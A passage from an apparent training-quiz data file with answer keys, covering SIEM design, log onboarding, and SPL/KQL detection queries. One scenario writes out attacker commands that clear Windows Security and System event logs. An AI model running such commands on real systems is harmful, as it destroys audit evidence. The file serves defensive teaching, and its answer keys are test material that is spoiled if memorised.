          explanation: "Disabling (A) loses real detection. The correct discipline is scoped allowlisting (user + host + window) with a comment trail so the exclusion can be audited and revisited. Lowering thresholds (C) makes noise worse."
        },
        {
          id: "la-q5-7",
          difficulty: "medium",
          tags: ["Retention", "Cost"],
          scenario: "Your SIEM hot tier is at 95% capacity. CFO wants spend cut 30%. Logs include 60% verbose application DEBUG that no detection uses.",
          question: "Best architectural fix?",
          options: [
            "Buy more hot storage.",
            "Tiered retention: route DEBUG/INFO to cold/cheap object storage (or a data lake) with on-demand search; keep auth/audit/EDR/network on hot for 30–90 days; archive older to cold. Detections continue uninterrupted.",
            "Stop logging.",
            "Delete logs older than 24h.",
          ],
          correctAnswer: 1,
          explanation: "Tiered architecture (hot SIEM + cold data lake) is the standard cost-control answer. Security-relevant data stays fast; verbose dev data is preserved cheaply and searchable on-demand for incident timelines."
        },
        {
          id: "la-q5-8",
          difficulty: "hard",
          tags: ["Detection Engineering", "Sigma"],
          question: "Why is writing a detection in Sigma (vendor-neutral YAML) preferred over writing it natively in one SIEM's query language for a security team that runs Splunk today but is piloting Sentinel?",
          options: [
            "Sigma is faster at runtime.",
            "Sigma is portable — one rule converts (sigmac / pySigma) to Splunk SPL, KQL, Elastic EQL, etc. The detection logic, not the syntax, becomes the source of truth, and the team can switch/multi-SIEM without rewriting the library.",
            "Sigma has fewer false positives.",
            "Sigma is required by PCI.",
          ],
          correctAnswer: 1,
          explanation: "Vendor lock-in is the silent killer of detection libraries. Sigma captures the logic once; converters emit per-vendor syntax. The team can run dual-SIEM during migration without doubling engineering work."
        },
        {
          id: "la-q5-9",
          difficulty: "hard",
          tags: ["Operational", "Alert Triage"],
          scenario: "Your queue holds 480 alerts across 4 analysts on shift. Many are repeats of the same underlying event.",
          question: "Most impactful operational fix?",
          options: [
            "Hire 4 more analysts.",
            "Aggregate alerts into incidents (group by entity + technique + time window), tune the top noise-makers, and add suppression for known benign patterns — analyst capacity is wasted on duplicate triage, not on real cases.",
            "Disable the noisy detections.",
            "Stop ingesting noisy sources.",
          ],
          correctAnswer: 1,
          explanation: "Alert-to-incident aggregation + targeted tuning is the proven analyst-capacity multiplier. Hiring (A) treats symptoms; disabling sources/detections (C,D) loses coverage. Track 'time to triage' and 'alerts per incident' as the operational KPIs."
        },
        {
          id: "la-q5-10",
          difficulty: "hard",
          tags: ["Best Practice", "Time Sync"],
          scenario: "Post-incident review: your timeline is 11 minutes off between firewall and EDR, making causality ambiguous in the report.",
          question: "Root cause and durable fix?",
          options: [
            "Reformat the report.",
            "Clock drift — firewall NTP source disagreed with the EDR's. Enforce a single authoritative NTP/PTP source for every log-producing system, monitor drift via a SIEM detection (e.g. event_time vs ingest_time > 60s), and standardize on UTC.",
            "Use a faster firewall.",
            "Ignore time fields in the report.",
          ],
          correctAnswer: 1,
          explanation: "Drift is silent and lethal to investigations. Single NTP source + drift monitoring + UTC everywhere is the fix. Add a regular detection on 'ingest_time - event_time' to catch sources whose clocks slip."
        },
    ]
  },

  // ==========================================
  // SIEM FUNDAMENTALS QUIZZES
  // ==========================================
  {
    quizId: "siem-q1",
    courseId: "siem-fundamentals",
    title: "SIEM Architecture & Data Flow",
    description: "Scenario-based quiz on how a SIEM ingests, parses, and stores telemetry end-to-end.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q1-1",
        difficulty: "easy",
        tags: ["Architecture", "Splunk"],
        scenario: "You are drawing the data path for a new Splunk deployment:\n  Endpoints (UF) → ?  → ?  → Analyst's browser\nYour senior asks you to label each tier.",
        question: "Which ordering of Splunk components correctly represents the path from a forwarded event to an analyst's search result?",
        options: [
          "Universal Forwarder → Search Head → Indexer → Browser",
          "Universal Forwarder → Heavy Forwarder/Indexer (parse + store) → Search Head (query + render) → Browser",
          "Universal Forwarder → Browser → Indexer → Search Head",
          "Universal Forwarder → Deployment Server → Browser → Indexer"
        ],
        correctAnswer: 1,
        explanation: "UFs ship raw data to indexers (or a heavy forwarder first), which parse and write tsidx + raw buckets. The search head dispatches SPL to indexers, merges results, and renders them in the browser. (A) inverts indexer/search head. (D) confuses the deployment server (config management) with the data path."
      },
      {
        id: "siem-q1-2",
        difficulty: "medium",
        tags: ["Ingestion", "Sizing", "EPS"],
        scenario: "Procurement asks you to size a SIEM license. You measure baseline EPS over a week:\n  Avg EPS: 4,200\n  Peak EPS (business hours): 11,500\n  P95 EPS: 8,800\nVendor licenses are sold in steady-state EPS bands (5k, 10k, 15k).",
        question: "Which tier should you recommend and why?",
        options: [
          "5k — match the long-term average; bursts are fine.",
          "10k — size to P95 so steady-state burst headroom is real; peaks can be smoothed by the indexer queue.",
          "15k — always license to peak.",
          "5k plus a hard rate-limit at the forwarders to drop excess events."
        ],
        correctAnswer: 1,
        explanation: "Sizing to the average under-licenses; sizing to peak over-pays. P95 (10k tier here) is the standard SOC compromise — short bursts above P95 are absorbed by indexer ingestion queues. (D) drops security-relevant data — never acceptable for detection."
      },
      {
        id: "siem-q1-3",
        difficulty: "medium",
        tags: ["Normalization", "CIM"],
        scenario: "Two sources log a failed login differently:\n  Windows 4625:  TargetUserName=jdoe  IpAddress=10.4.2.9  Status=0xC000006A\n  Okta:         {\"actor\":{\"alternateId\":\"[email protected]\"},\"client\":{\"ipAddress\":\"10.4.2.9\"},\"outcome\":{\"result\":\"FAILURE\"}}\nYou want a single correlation rule that fires on N failed logins per user across BOTH sources.",
        question: "Which approach is correct?",
        options: [
          "Write two separate rules, one per source.",
          "Normalize both into a common schema (CIM/ECS) — e.g. user, src, action, outcome — then write one rule on the normalized fields.",
          "Strip both down to raw text and grep for 'fail'.",
          "Forward Okta logs into the Windows index so they share parsers."
        ],
        correctAnswer: 1,
        explanation: "Common Information Model (Splunk CIM) / Elastic Common Schema (ECS) exist precisely for this — map disparate vendor fields to canonical names (user, src, action) at parse time so detections are written once. (A) doubles maintenance. (D) corrupts source typing and breaks parsing."
      },
      {
        id: "siem-q1-4",
        difficulty: "medium",
        tags: ["Storage Tiering"],
        scenario: "Your SIEM has 30 days hot, 90 days warm, 365 days cold. An IR team needs to investigate an incident from 6 months ago.",
        question: "What is the realistic expectation when querying that data?",
        options: [
          "Same speed as a search over the last 24 hours.",
          "The search will run, but significantly slower — cold buckets must be thawed/rehydrated, and some platforms require an admin-initiated restore.",
          "The data is permanently gone; no investigation possible.",
          "The SIEM will automatically promote the data back to hot indefinitely."
        ],
        correctAnswer: 1,
        explanation: "Cold storage trades retrieval latency for cost. Some platforms (e.g. Splunk frozen/S3, Sentinel basic logs) require an explicit restore/search-job before the data is queryable. Plan retention tiers around realistic IR needs."
      },
      {
        id: "siem-q1-5",
        difficulty: "hard",
        tags: ["Search Performance", "tstats"],
        scenario: "A nightly Splunk search:\n  index=* sourcetype=* fail* | stats count by user\ntakes 45 minutes and times out. Daily volume is ~2 TB.",
        question: "Which rewrite gives the biggest, correct performance win?",
        options: [
          "Add | head 1000 at the end.",
          "Scope to specific indexes/sourcetypes and use accelerated data models with tstats, e.g. | tstats count from datamodel=Authentication where Authentication.action=failure by Authentication.user",
          "Remove the time picker so it scans everything.",
          "Run the same search but at 3 a.m."
        ],
        correctAnswer: 1,
        explanation: "index=* sourcetype=* is the worst possible filter — it forces every bucket to be opened. tstats reads tsidx (indexed metadata) instead of raw events and is often 10–100x faster, especially against an accelerated data model. (A) limits output AFTER the expensive work."
      },
      {
        id: "siem-q1-6",
        difficulty: "medium",
        tags: ["Correlation", "Detection"],
        scenario: "You want to detect: 'A user fails to log in ≥10 times within 5 minutes AND then succeeds from the SAME source IP.' (Classic brute-force success.)",
        question: "Which SIEM capability is required to express this?",
        options: [
          "A simple keyword alert on 'failed login'.",
          "Stateful correlation across multiple events with shared join keys (user, src_ip) within a sliding time window.",
          "A dashboard refresh every 5 minutes.",
          "A retention policy change."
        ],
        correctAnswer: 1,
        explanation: "This is multi-event, multi-condition correlation: count threshold + follow-on success + shared user/src — exactly what correlation engines (Splunk ES, Sentinel analytics rules, QRadar offenses) exist for. Single keyword alerts cannot express the success-follows-failure relationship."
      },
      {
        id: "siem-q1-7",
        difficulty: "medium",
        tags: ["Log Source Health"],
        scenario: "Your 'Failed logon brute-force' rule has fired daily for months. For the last 3 days it has fired ZERO times. The SOC manager is happy ('attacks went down'). You are not.",
        question: "What is the correct first action?",
        options: [
          "Celebrate — the rule worked, attackers gave up.",
          "Check log source health: confirm the underlying Windows Security / auth log feed is still ingesting and parsing correctly. Silence often means a broken pipeline, not safety.",
          "Lower the threshold to make it fire again.",
          "Delete the rule — clearly not needed."
        ],
        correctAnswer: 1,
        explanation: "Sudden silence on a historically noisy detection is a classic blind-spot indicator: a forwarder died, a parser broke after a Windows update, or a GPO disabled the audit subcategory. Always treat 'too quiet' as a P2 until proven otherwise."
      },
      {
        id: "siem-q1-8",
        difficulty: "hard",
        tags: ["Architecture", "Cloud SIEM"],
        scenario: "Your org is migrating from on-prem Splunk to Microsoft Sentinel. A skeptic claims 'cloud SIEM means we lose all our detections.'",
        question: "What is the accurate, nuanced response?",
        options: [
          "They're right — start from scratch.",
          "Detection LOGIC is portable (especially if written in Sigma); the query SYNTAX (SPL → KQL) and data model (CIM → ASIM) require translation, but the analytic intent migrates with effort.",
          "Cloud SIEMs don't support custom detections at all.",
          "Just export the SPL files and import them directly into Sentinel."
        ],
        correctAnswer: 1,
        explanation: "Sigma-first detection engineering exists for exactly this reason. SPL and KQL are different dialects, and CIM ↔ ASIM field mapping is non-trivial, but the underlying detection IDEAS (impossible travel, LOLBin spawn, etc.) port directly. (D) is false — there is no SPL-to-KQL one-click import."
      },
      {
        id: "siem-q1-9",
        difficulty: "easy",
        tags: ["Ingestion", "Syslog"],
        scenario: "A network engineer offers two options to ship firewall logs:\n  A) UDP 514 (classic syslog)\n  B) TCP 6514 with TLS\nThe firewalls log auth events used in compliance reporting.",
        question: "Which do you choose and why?",
        options: [
          "A — UDP is faster and easier.",
          "B — TCP guarantees delivery (no silent drops under load) and TLS prevents tampering/sniffing of log content in transit, which matters for compliance evidence.",
          "Doesn't matter — both are equivalent.",
          "Neither — use email."
        ],
        correctAnswer: 1,
        explanation: "UDP 514 silently drops under congestion and ships plaintext. For security-relevant or compliance data, RFC 5425 syslog-over-TLS (6514) is the standard. Lost auth logs = broken detection AND audit failure."
      },
      {
        id: "siem-q1-10",
        difficulty: "medium",
        tags: ["RBAC", "Data Sensitivity"],
        scenario: "HR forwards Workday audit logs (containing salaries and PII) to the SIEM so insider-threat rules can run. A Tier 1 analyst can currently search those events.",
        question: "What's the correct control?",
        options: [
          "Stop ingesting the data — too risky.",
          "Ingest into a restricted index/workspace with role-based access; detections run as a service account, raw events are visible only to authorized roles, and field-level masking hides salary values from Tier 1.",
          "Let everyone see everything — analysts need full context.",
          "Email the HR data to analysts on request only."
        ],
        correctAnswer: 1,
        explanation: "SIEMs support index-level RBAC and field masking precisely for this — the DETECTION needs the data, but the HUMAN doesn't need the raw PII. Restricted index + masked fields + service-account searches = least privilege while preserving detection value."
      },
      {
        id: "siem-q1-11",
        difficulty: "hard",
        tags: ["Time", "Investigation"],
        scenario: "During IR, you compare two events from the same incident:\n  Firewall:  2026-06-15 08:14:22 +00:00  deny src=1.2.3.4\n  EDR:       2026-06-15 03:14:47          process.create lsass dump\nYour timeline shows the EDR event 5 hours BEFORE the firewall event, which contradicts the attack story.",
        question: "Most likely cause and fix?",
        options: [
          "The attacker time-traveled.",
          "The EDR is logging in local time (EST) without TZ offset; firewall is UTC. Normalize all event_time to UTC at ingest and enforce TZ-aware parsing in the props/sourcetype config.",
          "Delete the older event.",
          "Ignore — timestamps don't matter for IR."
        ],
        correctAnswer: 1,
        explanation: "Missing/implicit timezones are one of the top causes of broken IR timelines. Standard practice: every parser converts to UTC, the raw local time is preserved in a separate field for reference, and a 'clock drift' detection alerts when event_time vs ingest_time skews > 60s."
      },
      {
        id: "siem-q1-12",
        difficulty: "medium",
        tags: ["Parsing", "Field Extraction"],
        scenario: "A new SaaS app sends a single unparsed log line:\n  2026-06-15T08:14 LOGIN user=\"jdoe\" result=\"FAIL\" geo=\"IN-Bengaluru\"\nThe SIEM ingests it as one big _raw string. The 'Failed Logins' dashboard shows ZERO events from this app.",
        question: "Root cause?",
        options: [
          "The SIEM is broken.",
          "No source-type-specific parser/field extraction exists yet — user, result, geo are not extracted as searchable fields, so dashboards filtering on result=FAIL never match.",
          "The vendor doesn't support failed logins.",
          "The geo field is wrong."
        ],
        correctAnswer: 1,
        explanation: "Field extraction is a prerequisite for everything downstream — search, dashboards, correlation. Add a sourcetype with a KV/regex extractor (or onboarding via an add-on/integration) so the SIEM tokenizes user, result, geo. Until then, the data is invisible to structured queries."
      },
      {
        id: "siem-q1-13",
        difficulty: "easy",
        tags: ["Enrichment"],
        scenario: "Your raw alert shows: 'Failed login from 185.220.101.45 for user admin.' Tier 1 has to swivel-chair to AbuseIPDB, MaxMind, and a Tor exit-node list every time.",
        question: "Which SIEM capability eliminates this swivel-chair?",
        options: [
          "Bigger monitor.",
          "Automated enrichment at ingest or alert-time: append ASN/GeoIP, threat-intel score, and Tor flag as event fields so the analyst sees them in the alert.",
          "Block all foreign IPs.",
          "Disable the rule."
        ],
        correctAnswer: 1,
        explanation: "Enrichment (lookups, asset/identity context, threat-intel) is the single biggest lever for reducing triage time. The analyst's first 30 seconds should answer 'is this IP known-bad?' without leaving the SIEM."
      },
      {
        id: "siem-q1-14",
        difficulty: "hard",
        tags: ["Detection Engineering", "Sigma"],
        scenario: "Your team runs Splunk now and is piloting Sentinel. You have 200 detections written in raw SPL.",
        question: "Which strategy minimizes long-term cost?",
        options: [
          "Maintain 200 SPL rules AND rewrite 200 KQL rules in parallel forever.",
          "Convert the library to Sigma (vendor-neutral YAML) as source-of-truth; use sigmac/pySigma to emit SPL today and KQL tomorrow. New detections are authored in Sigma first.",
          "Pick one SIEM and abandon the other.",
          "Ask the vendor to translate them."
        ],
        correctAnswer: 1,
        explanation: "Sigma decouples detection LOGIC from vendor SYNTAX. The team writes once, compiles to whichever backend(s) the org runs. This is the standard answer to multi-SIEM, migrations, and vendor lock-in."
      },
      {
        id: "siem-q1-15",
        difficulty: "medium",
        tags: ["KPI", "SOC Operations"],
        scenario: "Leadership asks for ONE metric to track SIEM health on the exec dashboard.",
        question: "Which is most meaningful?",
        options: [
          "Total events ingested per day (bigger = better).",
          "True-positive rate / alert fidelity, viewed alongside MTTD and MTTR — measures whether the SIEM actually helps detect and respond, not just how much data it consumes.",
          "Number of dashboards built.",
          "Splunk license utilization %."
        ],
        correctAnswer: 1,
        explanation: "EPS and dashboard counts are vanity metrics. Alert fidelity (TP / (TP + FP)) plus MTTD/MTTR directly reflect SOC effectiveness — they answer 'are we catching real threats fast?' which is the SIEM's actual job."
      }
    ]
  },
  {
    quizId: "siem-q2",
    courseId: "siem-fundamentals",
    title: "Data Onboarding & Pipeline Engineering",
    description: "Scenario quiz on bringing new log sources online without breaking detection.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q2-1",
        difficulty: "medium",
        tags: ["Onboarding", "Change Management"],
        scenario: "A vendor pushes a parser update for your firewall add-on. After the upgrade, three correlation rules stop firing.",
        question: "What was the missing pre-deployment step?",
        options: [
          "Reboot every indexer first.",
          "Stage the parser change in a dev/test environment, replay representative live data, and validate every dependent detection BEFORE promoting to production.",
          "Disable all detections during the upgrade.",
          "Skip the update."
        ],
        correctAnswer: 1,
        explanation: "Parser changes silently rename or remove fields (action vs act, src_ip vs srcip). Every onboarding/upgrade needs a dev tier with sample replay AND a regression check of dependent saved searches/rules. Detection engineering = code; treat it with the same CI discipline."
      },
      {
        id: "siem-q2-2",
        difficulty: "easy",
        tags: ["Agent vs Agentless"],
        scenario: "You need logs from 5,000 Linux servers running mixed kernels. Some teams refuse to install agents.",
        question: "Which collection strategy is most pragmatic?",
        options: [
          "Force the agent everywhere — no exceptions.",
          "Hybrid: Universal Forwarder on servers that allow agents (richer collection, file/process visibility); rsyslog → centralized syslog collector for the rest. Document the visibility delta.",
          "Email logs nightly.",
          "Skip the holdouts."
        ],
        correctAnswer: 1,
        explanation: "Real environments are hybrid. Agents give you tailing of arbitrary files, metadata, and reliable buffering. Agentless syslog covers political holdouts but is limited to what the OS already emits. Document the gap so detection authors know which hosts CAN'T see Sysmon-equivalent data."
      },
      {
        id: "siem-q2-3",
        difficulty: "hard",
        tags: ["Cost Control", "Tiering"],
        scenario: "Your hot tier is at 95% and CFO wants 30% cost reduction. Audit shows 60% of ingest is DEBUG-level app logs that NO detection uses. Compliance requires keeping them for 1 year.",
        question: "Best approach?",
        options: [
          "Delete the DEBUG logs entirely.",
          "Route DEBUG logs to a cheap data-lake tier (S3/ADLS) with cold-search capability; keep security-relevant log levels in the hot SIEM tier. Compliance retention satisfied, hot tier freed.",
          "Cut all retention to 7 days.",
          "Move to a cheaper SIEM vendor."
        ],
        correctAnswer: 1,
        explanation: "Tiered architecture (hot SIEM + cold data lake, e.g. Splunk Federated Search, Sentinel Basic Logs, Cribl, Chronicle) is the standard cost-control answer. Detection-relevant data stays fast; compliance/forensics data stays cheap but searchable."
      },
      {
        id: "siem-q2-4",
        difficulty: "medium",
        tags: ["AWS", "Cloud Logging"],
        scenario: "You're onboarding AWS. Available sources:\n  - CloudTrail (control-plane API calls)\n  - VPC Flow Logs (network 5-tuple)\n  - GuardDuty findings\n  - S3 server access logs",
        question: "Which is the FIRST priority for detection coverage of identity compromise (the #1 cloud risk)?",
        options: [
          "VPC Flow Logs.",
          "CloudTrail — every IAM action (AssumeRole, CreateUser, console login, key creation) lands here; without it you cannot detect credential abuse.",
          "S3 server access logs.",
          "GuardDuty alone."
        ],
        correctAnswer: 1,
        explanation: "CloudTrail is the audit log of AWS. Identity-based attacks (compromised access keys, role assumption chains, persistence via new IAM users) are invisible without it. VPC Flow and S3 access are valuable but secondary. GuardDuty is signal, not raw evidence."
      },
      {
        id: "siem-q2-5",
        difficulty: "medium",
        tags: ["Tamper Resistance"],
        scenario: "An attacker with local admin on a Windows server runs:\n  wevtutil cl Security\n  wevtutil cl System\nThey then continue lateral movement.",
        question: "Why does your investigation still succeed?",
        options: [
          "Windows refuses to clear the logs.",
          "Logs were forwarded to the SIEM in near-real-time before the clear; the central copy is on infrastructure the attacker has no privilege on. Event ID 1102 (audit log cleared) is itself a high-fidelity detection.",
          "wevtutil doesn't actually delete logs.",
          "The attacker's clear command is automatically rolled back."
        ],
        correctAnswer: 1,
        explanation: "This is the entire reason we ship logs OFF the endpoint. Local logs are at the attacker's mercy; centralized SIEM copies are not. Event 1102 / 4 (log cleared) is also one of the strongest 'someone is hiding tracks' signals — alert on it with high severity."
      },
      {
        id: "siem-q2-6",
        difficulty: "hard",
        tags: ["Schema Drift", "Detection Reliability"],
        scenario: "A vendor renames a field across all events:\n  user_name → userName\nYour 47 detections referencing user_name silently stop matching. No alerts. No errors.",
        question: "What engineering practice prevents this?",
        options: [
          "Hope the vendor doesn't rename things.",
          "Schema/field contract tests: scheduled validators that assert critical fields exist and have non-null cardinality. Alert on drift. Combine with a normalization layer so detections reference canonical names, not vendor names.",
          "Manually re-check every rule weekly.",
          "Stop using that vendor."
        ],
        correctAnswer: 1,
        explanation: "Silent schema drift is one of the top causes of broken detection. Mitigations: (1) normalize to CIM/ECS so detections reference stable canonical fields, (2) automated 'field exists and is populated' health checks, (3) detection unit tests in CI."
      },
      {
        id: "siem-q2-7",
        difficulty: "medium",
        tags: ["EDR Integration"],
        scenario: "You onboard CrowdStrike via FDR (Falcon Data Replicator) into the SIEM. After two weeks, indexers are at 90% disk. EDR alone is 4 TB/day — half your total ingest.",
        question: "Smartest tuning approach?",
        options: [
          "Stop ingesting EDR.",
          "Filter at the source/forwarder: drop low-value DNS resolutions and high-volume innocuous process telemetry that you don't use in any detection, while preserving Sysmon-equivalent EIDs you DO use. Document every drop.",
          "Buy more disk forever.",
          "Sample randomly — drop 50% of events."
        ],
        correctAnswer: 1,
        explanation: "Edge filtering (Cribl, Splunk ingest actions, Logstash) is the right scalpel. Random sampling (D) breaks correlation. The discipline: every drop rule is reviewed by detection engineering AND logged in a 'what we don't ingest' register so future authors aren't blindsided."
      },
      {
        id: "siem-q2-8",
        difficulty: "easy",
        tags: ["CEF", "Standards"],
        scenario: "Three vendors ship logs in CEF (Common Event Format).",
        question: "Why does CEF matter to a SIEM team?",
        options: [
          "It's a vendor lock-in trap.",
          "CEF defines a predictable header + key=value structure, so a single parser handles many vendors with minimal per-vendor work, and fields normalize cleanly to CIM/ASIM.",
          "CEF is encrypted.",
          "CEF is required by GDPR."
        ],
        correctAnswer: 1,
        explanation: "CEF (and LEEF for QRadar) reduces onboarding cost dramatically — predictable structure means write-once parsers and consistent field naming. It's the closest the industry has to a 'common security log dialect.'"
      },
      {
        id: "siem-q2-9",
        difficulty: "hard",
        tags: ["Pipeline", "Cribl/Edge Routing"],
        scenario: "You introduce an observability pipeline (Cribl) between sources and your SIEM. The architect proposes routing FULL fidelity to a cold lake and only HIGH-VALUE events to the hot SIEM.",
        question: "Main risk and how to mitigate?",
        options: [
          "No risk — ship it.",
          "Risk: a detection-relevant event is dropped from the hot path and never alerts. Mitigation: keep an authoritative inventory of detection-required fields/events, version the routing rules, and run a 'detection coverage diff' before any routing change reaches production.",
          "Risk: Cribl is too fast.",
          "Risk: the cold lake costs more than hot."
        ],
        correctAnswer: 1,
        explanation: "Pipelines are powerful but become a hidden detection layer. Treat routing rules as code: PR review, change diff vs the detection library, dev-tier replay, and a rollback plan. Otherwise a 'cost optimization' silently kills alerts."
      },
      {
        id: "siem-q2-10",
        difficulty: "medium",
        tags: ["Identity"],
        scenario: "Onboarding Azure AD sign-in logs. The detection team wants to write 'impossible travel' and 'risky sign-in' rules.",
        question: "Which Azure AD log streams are required at minimum?",
        options: [
          "Only Audit logs.",
          "SigninLogs (interactive + non-interactive), plus IdentityRiskEvents for ID Protection signals; Audit logs for directory changes used in privilege-escalation detections.",
          "Only the activity log.",
          "Only Defender alerts."
        ],
        correctAnswer: 1,
        explanation: "SigninLogs carry the who/where/how of authentication; non-interactive sign-ins are where token replay and refresh-token abuse hide. IdentityRiskEvents add Microsoft's risk scoring. Audit logs cover the persistence side (new app registrations, role assignments)."
      },
      {
        id: "siem-q2-11",
        difficulty: "medium",
        tags: ["Lookups", "Asset Context"],
        scenario: "Alerts say 'login from 10.4.7.22'. Analysts have no idea if that's a printer, a domain controller, or a CFO laptop.",
        question: "What's the standard fix?",
        options: [
          "Make analysts memorize the IP plan.",
          "Maintain an asset/identity lookup (CMDB → SIEM lookup table) keyed on IP/hostname and enrich every alert with owner, criticality, environment, and OS at search-time.",
          "Stop using internal IPs.",
          "Ignore internal source IPs."
        ],
        correctAnswer: 1,
        explanation: "Asset context turns a noisy alert into a prioritizable one. Splunk ES Asset & Identity Framework, Sentinel Watchlists, QRadar Reference Data — every mature SIEM has this. Refresh the lookup nightly from the CMDB."
      },
      {
        id: "siem-q2-12",
        difficulty: "hard",
        tags: ["Late-Arriving Data"],
        scenario: "A cloud connector batches events and delivers them 45 minutes late. Your near-real-time correlation rule (5-minute window) NEVER fires on these events even when the pattern is clearly present.",
        question: "Root cause and correct redesign?",
        options: [
          "The rule is wrong; rewrite the logic.",
          "Real-time correlation windows operate on INGEST time but the events are stamped with EVENT time 45 min in the past — they fall outside the live window. Redesign: switch to a scheduled batch search over a window that accounts for ingest latency, or use the platform's late-arrival/event-time correlation mode.",
          "Increase the rule severity.",
          "Drop the late-arriving source."
        ],
        correctAnswer: 1,
        explanation: "Event-time vs ingest-time is a classic gotcha. Real-time stream correlation can't see the past. For lagged sources, use scheduled/batch detections with a window that brackets typical lag (e.g. last 60 min, every 10 min) or platform features like Sentinel's near-real-time analytics with appropriate lookback."
      },
      {
        id: "siem-q2-13",
        difficulty: "medium",
        tags: ["DNS"],
        scenario: "You're choosing what DNS telemetry to onboard. Options: (a) DNS server query logs, (b) endpoint DNS (Sysmon EID 22 / EDR), (c) passive DNS at the resolver.",
        question: "For detecting C2 beacons and DGA traffic from a single endpoint, what's the highest-fidelity source?",
        options: [
          "Resolver passive DNS only — aggregated org-wide.",
          "Endpoint DNS (Sysmon 22 / EDR) — attributes the query to the EXACT process and host, which resolver/server logs cannot. Combine with resolver logs for fallback coverage of unmanaged hosts.",
          "DHCP logs.",
          "Firewall logs only."
        ],
        correctAnswer: 1,
        explanation: "Server/resolver DNS knows the host but not the process. Endpoint DNS attributes the query to the specific process making it — essential for proving 'powershell.exe queried evil.com' rather than 'something on host01 did.' Best practice: collect both."
      },
      {
        id: "siem-q2-14",
        difficulty: "hard",
        tags: ["Detection Reliability", "Testing"],
        scenario: "You're proposing a 'detection-as-code' workflow: rules live in Git, PRs run automated tests, deployment via CI.",
        question: "Which test type catches the MOST production breakage cheaply?",
        options: [
          "Linting the YAML/Sigma syntax only.",
          "Replay tests: known-malicious and known-benign sample events are run through the parser+detection pipeline in CI; the rule must fire on the malicious set and stay silent on the benign set. Catches regressions from parser, schema, and logic changes simultaneously.",
          "Manual peer review only.",
          "Production monitoring after deploy only."
        ],
        correctAnswer: 1,
        explanation: "Replay/'fixture' tests are the industry's highest-ROI safeguard — they catch parser drift, field renames, AND logic regressions in one shot. Linting catches syntax. Peer review and prod monitoring matter but don't substitute for objective behavioral tests."
      },
      {
        id: "siem-q2-15",
        difficulty: "medium",
        tags: ["Compliance", "PCI/GDPR"],
        scenario: "Compliance asks: 'Can you prove logs were not tampered with between source and SIEM?'",
        question: "Strongest technical answer?",
        options: [
          "'Trust us.'",
          "TLS in transit (TCP 6514) + WORM/immutable storage tier for compliance retention + audit trail on the SIEM admin role (who searched, who exported, who deleted). Combine with source-side log signing where supported.",
          "Lock the server room.",
          "Backup to tape monthly."
        ],
        correctAnswer: 1,
        explanation: "PCI/SOX/GDPR ask about integrity and access control. The defensible answer chains: transport encryption, immutable storage (S3 Object Lock, Splunk frozen WORM, Azure immutable blobs), and admin auditing — so any tamper attempt is detectable AND attributable."
      }
    ]
  },
  {
    quizId: "siem-q3",
    courseId: "siem-fundamentals",
    title: "SPL & KQL in the Trenches",
    description: "Hands-on scenario quiz: write and read the queries you'll use every shift.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "siem-q3-1",
        difficulty: "medium",
        tags: ["SPL", "Brute Force"],
        scenario: "Investigating a possible brute force against Windows accounts in the last hour. You want: top 10 (user, src_ip) pairs by failed logon count, only pairs with ≥ 20 failures.",
        question: "Which SPL is correct?",
        options: [
          "index=wineventlog EventCode=4625 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
          "index=wineventlog | top user src_ip",
          "index=* fail | head 10",
          "index=wineventlog EventCode=4624 | stats values(user) by src_ip"
        ],
        correctAnswer: 0,
        explanation: "(A) scopes to the right EID (4625 = failed logon), aggregates by the right keys, filters with where, sorts descending, and head-limits — the canonical SPL brute-force triage. (D) uses 4624 (SUCCESSFUL logon). (B)/(C) lack the failure filter and threshold."
      },
      {
        id: "siem-q3-2",
        difficulty: "medium",
        tags: ["KQL", "Sentinel", "Impossible Travel"],
        scenario: "Sentinel — for each user in the last 24h, you want the count of DISTINCT countries they signed in from, surfacing users with > 2 countries.",
        question: "Which KQL is correct?",
        options: [
          "SigninLogs | where Country != 'US'",
          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | project Country | distinct Country",
          "SigninLogs | summarize count() by UserPrincipalName"
        ],
        correctAnswer: 1,
        explanation: "summarize + dcount is KQL's standard pattern for 'distinct count grouped by'. (D) counts total sign-ins (noisy users dominate, not travellers). (C) drops the per-user grouping entirely."
      },
      {
        id: "siem-q3-3",
        difficulty: "hard",
        tags: ["SPL", "Performance"],
        scenario: "A search is slow:\n  index=* sourcetype=* user=jdoe earliest=-7d | stats count\nDaily ingest is 5 TB across 40 sourcetypes; jdoe appears in only 2 of them.",
        question: "Biggest single performance win?",
        options: [
          "Add | head 1 at the end.",
          "Replace index=* sourcetype=* with the specific index(es) and sourcetype(s) where 'user' is a real, extracted field. The fewer buckets opened and the more selective the filters BEFORE the first pipe, the better.",
          "Run it at midnight.",
          "Add | fields user count to the end."
        ],
        correctAnswer: 1,
        explanation: "index=* sourcetype=* defeats Splunk's bucket pruning — every index for the time range is opened. Specificity at the FIRST search command (the 'base search') is the single biggest lever. Adding accelerated data models + tstats is the next step."
      },
      {
        id: "siem-q3-4",
        difficulty: "medium",
        tags: ["KQL", "join"],
        scenario: "You need to find users who had a failed sign-in AND a successful sign-in from the SAME IP within 10 minutes (brute-force success).",
        question: "Which KQL pattern is appropriate?",
        options: [
          "Two separate queries, eyeball the results.",
          "SigninLogs | where ResultType != 0 | project user=UserPrincipalName, ip=IPAddress, failTime=TimeGenerated | join kind=inner (SigninLogs | where ResultType == 0 | project user=UserPrincipalName, ip=IPAddress, successTime=TimeGenerated) on user, ip | where successTime between (failTime .. failTime + 10m)",
          "SigninLogs | summarize count() by UserPrincipalName",
          "SigninLogs | where ResultType == 0 and ResultType != 0"
        ],
        correctAnswer: 1,
        explanation: "Self-join with shared keys (user, ip) + a time-window predicate is the canonical KQL recipe for 'event A followed by event B within N minutes'. (D) is a logical impossibility on a single row."
      },
      {
        id: "siem-q3-5",
        difficulty: "hard",
        tags: ["SPL", "Stats vs Transaction"],
        scenario: "You want to group all events of a user session (logon → activity → logoff) and compute session duration.",
        question: "Which approach scales better on a 50 GB/day index?",
        options: [
          "transaction user maxspan=8h startswith=eval(EventCode=4624) endswith=eval(EventCode=4634) — simple but expensive.",
          "stats with min(_time) and max(_time) by session_key (e.g. LogonID), then eval duration = max-min — far cheaper than transaction at scale, since stats is distributable to indexers.",
